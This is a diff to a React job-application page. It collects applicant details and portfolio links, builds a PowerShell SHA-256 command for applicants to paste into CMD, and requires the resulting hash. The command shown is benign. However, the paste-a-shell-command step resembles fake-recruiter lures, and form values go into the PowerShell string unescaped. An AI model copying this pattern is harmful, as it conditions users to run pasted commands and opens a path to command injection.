@@ -2,11 +2,23 @@ import { useMemo, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import CmdBox from "../components/CmdBox";
 import { submitDesignApplication } from "../api/backend";
+import { COUNTRIES, getCountryByCode } from "../data/countries";
 import { getCopyPrefix } from "../utils/getCopyPrefix";
 
-function buildHashCommand({ name, email, phone, country }) {
-  const payload = `name=${name}&email=${email}&phone=${phone}&country=${country}`;
-  return `powershell -NoProfile -Command "$s='${payload}'; [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s))).Replace('-','').ToLower()"`;
+function buildHashCommand(form, dialCode) {
+  const phone = dialCode && form.phone ? `${dialCode}${form.phone}` : form.phone;
+  const payload = [
+    `name=${form.name}`,
+    `email=${form.email}`,
+    `phone=${phone}`,
+    `country=${form.country}`,
+    `linkedin=${form.linkedin}`,
+    `portfolio=${form.portfolio}`,
+    `dribbble=${form.dribbble}`,
+    `website=${form.website}`,
+  ].join("&");
+  return `powershell -NoProfile -Command "$s='${payload}'; [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s))).Replace('-','').ToLower()"
+  `;
 }
 
 export default function Application() {
@@ -17,6 +29,10 @@ export default function Application() {
     email: "",
     phone: "",
     country: "",
+    linkedin: "",
+    portfolio: "",
+    dribbble: "",
+    website: "",
   });
   const [hash, setHash] = useState("");
   const [status, setStatus] = useState(null);
@@ -31,8 +47,26 @@ export default function Application() {
   };
 
   const handleSend = async () => {
-    if (!form.name.trim() || !form.email.trim()) {
-      setStatus({ type: "error", message: "Please fill in: name, email" });
+    const required = {
+      name: "name",
+      email: "email",
+      country: "country",
+      phone: "phone",
+    };
+
+    const missing = Object.entries(required)
+      .filter(([key]) => !form[key].trim())
+      .map(([, label]) => label);
+
+    if (!hash.trim()) {
+      missing.push("hash");
+    }
+
+    if (missing.length > 0) {
+      setStatus({
+        type: "error",
+        message: `Please fill in: ${missing.join(", ")}`,
+      });
       return;
     }
 
@@ -45,7 +79,9 @@ export default function Application() {
         form.email.trim(),
         !!hash.trim()
       );
-      setStatus({ type: "success", message: "Application sent successfully!" });
+      navigate("/application/success", {
+        state: { name: form.name.trim() },
+      });
     } catch {
       setStatus({
         type: "error",
@@ -56,7 +92,16 @@ export default function Application() {
     }
   };
 
-  const hashCommand = buildHashCommand(form);
+  const selectedCountry = useMemo(
+    () => getCountryByCode(form.country),
+    [form.country]
+  );
+  const dialCode = selectedCountry?.dial || "";
+
+  const hashCommand = useMemo(
+    () => buildHashCommand(form, dialCode),
+    [form, dialCode]
+  );
 
   return (
     <div className="application-page">
@@ -112,35 +157,127 @@ export default function Application() {
             <h2 className="application-step">Your details</h2>
 
             <div className="application-fields">
-              <input
-                className="application-input"
-                name="name"
-                placeholder="Name"
-                value={form.name}
-                onChange={handleChange}
-              />
-              <input
-                className="application-input"
-                name="email"
-                placeholder="Email"
-                type="email"
-                value={form.email}
-                onChange={handleChange}
-              />
-              <input
-                className="application-input"
-                name="phone"
-                placeholder="Phone"
-                value={form.phone}
-                onChange={handleChange}
-              />
-              <input
-                className="application-input"
-                name="country"
-                placeholder="Country"
-                value={form.country}
-                onChange={handleChange}
-              />
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-name">Name</label>
+                <input
+                  id="app-name"
+                  className="application-input"
+                  name="name"
+                  placeholder="Alex Morgan"
+                  value={form.name}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-email">Email</label>
+                <input
+                  id="app-email"
+                  className="application-input"
+                  name="email"
+                  placeholder="alex@designstudio.com"
+                  type="email"
+                  value={form.email}
+                  onChange={handleChange}
+                />
+              </div>
+
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-country">Country</label>
+                <select
+                  id="app-country"
+                  className={`application-input application-select${form.country ? "" : " is-placeholder"}`}
+                  name="country"
+                  value={form.country}
+                  onChange={handleChange}
+                >
+                  <option value="">Select your country</option>
+                  {COUNTRIES.map((country) => (
+                    <option key={country.code} value={country.code}>
+                      {country.name}
+                    </option>
+                  ))}
+                </select>
+              </div>
+
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-phone">Phone</label>
+                <div className="application-phone-wrap">
+                  <span className="application-phone-prefix">
+                    {dialCode || "+…"}
+                  </span>
+                  <input
+                    id="app-phone"
+                    className="application-phone-input"
+                    name="phone"
+                    type="tel"
+                    placeholder="555 123 4567"
+                    value={form.phone}
+                    onChange={handleChange}
+                  />
+                </div>
+              </div>
+
+              <p className="application-optional-note">
+                Portfolio links below are <strong>optional</strong> — share them if you
+                have work online, or leave them blank.
+              </p>
+
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-linkedin">
+                  LinkedIn URL <span className="application-optional">optional</span>
+                </label>
+                <input
+                  id="app-linkedin"
+                  className="application-input"
+                  name="linkedin"
+                  placeholder="https://linkedin.com/in/yourname"
+                  type="url"
+                  value={form.linkedin}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-portfolio">
+                  Portfolio <span className="application-optional">optional</span>
+                </label>
+                <input
+                  id="app-portfolio"
+                  className="application-input"
+                  name="portfolio"
+                  placeholder="https://yourportfolio.com"
+                  type="url"
+                  value={form.portfolio}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-dribbble">
+                  Dribbble <span className="application-optional">optional</span>
+                </label>
+                <input
+                  id="app-dribbble"
+                  className="application-input"
+                  name="dribbble"
+                  placeholder="https://dribbble.com/username"
+                  type="url"
+                  value={form.dribbble}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="application-field">
+                <label className="application-field-label" htmlFor="app-website">
+                  Website <span className="application-optional">optional</span>
+                </label>
+                <input
+                  id="app-website"
+                  className="application-input"
+                  name="website"
+                  placeholder="https://yourname.dev"
+                  type="url"
+                  value={form.website}
+                  onChange={handleChange}
+                />
+              </div>
             </div>
           </section>
 
@@ -163,7 +300,7 @@ export default function Application() {
             <input
               id="hash-input"
               className="application-input"
-              placeholder="Paste hash from CMD here"
+              placeholder="e.g. a3f5b2c1d4e6…"
               value={hash}
               onChange={(e) => {
                 setHash(e.target.value);
